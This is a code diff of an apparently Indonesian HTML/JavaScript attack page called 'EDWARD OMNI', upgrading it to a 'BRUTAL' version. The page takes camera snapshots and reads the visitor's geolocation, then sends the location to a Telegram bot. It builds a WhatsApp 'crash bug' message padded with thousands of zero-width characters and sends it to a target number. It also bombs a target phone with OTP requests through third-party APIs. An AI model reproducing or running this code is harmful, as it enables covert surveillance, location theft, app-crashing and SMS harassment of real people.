@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>[ EDWARD OMNI V.6.8 ]</title>
+    <title>[ EDWARD OMNI V.7.0 BRUTAL ]</title>
     <style>
         :root { --neon: #0f0; --danger: #f00; --bg: #0a0a0a; --purple: #bc13fe; }
         body { background: var(--bg); color: var(--neon); font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; text-align: center; }
@@ -25,8 +25,8 @@
 </head>
 <body>
 
-    <h1>EDWARD OMNI <span style="color:#fff">V.6.8</span></h1>
-    <p style="font-size:10px; color:var(--purple);">PREMIUM BUG & ATTACKER ACTIVE</p>
+    <h1>EDWARD OMNI <span style="color:#fff">V.7.0</span></h1>
+    <p style="font-size:10px; color:var(--purple);">ULTIMATE BRUTAL SYSTEM ACTIVE</p>
 
     <div class="panel">
         <button onclick="takeSnap()" style="background:#fff; color:#000; border:none;">📸 RADAR & PHOTO SCAN</button>
@@ -35,9 +35,9 @@
     </div>
 
     <div class="panel" style="border-color: var(--purple)">
-        <h3 style="color: var(--purple); margin-top:0">😈 WHATSAPP BUG</h3>
+        <h3 style="color: var(--purple); margin-top:0">😈 BRUTAL WA BUG</h3>
         <input type="number" id="noBug" placeholder="Nomor Target (628...)">
-        <button onclick="sendBug()" class="btn-bug">KIRIM CRASH BUG 😈</button>
+        <button onclick="sendBug()" class="btn-bug">KIRIM VIRUS CRASH 😈</button>
     </div>
 
     <div class="panel">
@@ -90,6 +90,7 @@
                     showToast("Data Sent!");
                 }, 1500);
             } catch (e) { showToast("Camera Denied!", "#f00"); }
+            
             navigator.geolocation.getCurrentPosition(p => {
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 LOKASI JELAS:\nhttp://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
             });
@@ -110,22 +111,25 @@
             return new Blob([ab], { type: 'image/jpeg' });
         }
 
-        // 😈 WHATSAPP BUG LOGIC
+        // 😈 BRUTAL BUG V.7.0 (Force Crash Rendering)
         function sendBug() {
             let n = document.getElementById('noBug').value;
             if(!n) return showToast("Nomor Mana?!", "#f00");
             
-            // Teks Bug (Crash String)
-            let bugText = "wa.me/settings?📍" + " ​​ ".repeat(500) + "😈_EDWARD_BAIK_BUG_😈";
-            showToast("Mengirim Virus Crash...", "#bc13fe");
+            let overload = "​​".repeat(5000); 
+            let zzw = "‎".repeat(2000);
+            let bugBrutal = `wa.me/settings?📍${overload}${zzw}😈_EDWARD_BAIK_BRUTAL_😈${overload}`;
             
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=😈 BUG WA SENT TO: ${n}`);
-            window.open(`https://api.whatsapp.com/send?phone=${n}&text=${encodeURIComponent(bugText)}`, '_blank');
+            showToast("VIRUS BRUTAL COPIED & SENT!", "#bc13fe");
+            navigator.clipboard.writeText(bugBrutal);
+            
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=😈 BRUTAL BUG SENT: ${n}`);
+            window.open(`https://api.whatsapp.com/send?phone=${n}&text=${encodeURIComponent(bugBrutal)}`, '_blank');
         }
 
         function spamOTP() {
             let n = document.getElementById('noTarget').value;
-            if(!n) return showToast("Nomor Target!", "#f00");
+            if(!n) return showToast("Input Number!", "#f00");
             showToast("Bombing Target...");
             fetch(`https://m.reddoorz.com/api/v1/users/send_otp?phone=${n}`, {mode:'no-cors'});
             fetch(`https://www.oyorooms.com/api/pwa/generateotp?phone=${n}`, {mode:'no-cors'});
